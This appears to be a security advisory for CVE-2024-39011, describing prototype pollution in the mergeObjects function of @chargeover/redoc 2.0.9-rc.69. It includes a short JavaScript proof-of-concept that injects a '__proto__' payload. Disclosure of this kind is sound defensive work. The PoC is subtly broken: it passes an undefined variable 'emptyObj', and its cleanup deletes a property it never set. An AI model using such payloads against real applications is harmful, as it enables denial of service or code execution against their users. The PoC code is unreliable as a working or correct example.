[CVE-2024-39011] Vulnerability Advisory: Prototype Pollution in @chargeover/redoc, version 2.0.9-rc.69

 [Raw](/mestrtee/693ef1c8b0a5ff1ae19f253381711f3e/raw/d57f3b7c763b6dedf05080d5fbeb3198ea9b0024/Advisory_Redocly.md)

[**Advisory\_Redocly.md**](#file-advisory_redocly-md)

**Vulnerability type:**
Prototype Pollution

**Vendor of the Package:**
Chargeover

**Affected Package:**

* Product: @chargeover/redoc
* Version: 2.0.9-rc.69

**Affected component(s):**

```
mergeObjects
```

**Attack vector(s):**
the attacker can modify built-in Object.prototype by calling the vulnerable function: `mergeObjects` with an argument containing a special property `__proto__` to pollute the application logic that can be escalated to Denial of service, remote code execution or cross-site scripting attacks.

**Description:**
Affected versions of this package are vulnerable to Prototype Pollution through the vulnerable function: `mergeObjects`. An attacker can alter the behavior of all objects inheriting from the affected prototype by passing arguments to the vulenrable function crafted with the built-in property: `__proto__`. The attack can potentially escalated to Denial of service, remote code execution or cross-site scripting attacks depends on the gadgets that may affected by the attack

**Proof-of-Concept:**

```
(async () => {
  const lib = await import('@chargeover/redoc');

  var victim = {}

  console.log("Before Attack: ", JSON.stringify(victim.__proto__));

  try {

  lib.mergeObjects (emptyObj, JSON.parse('{"__proto__":{"test":123}}'))

  } catch (e) { }

  console.log("After Attack: ", JSON.stringify(victim.__proto__));

  delete Object.prototype.polluted;

  })();
```
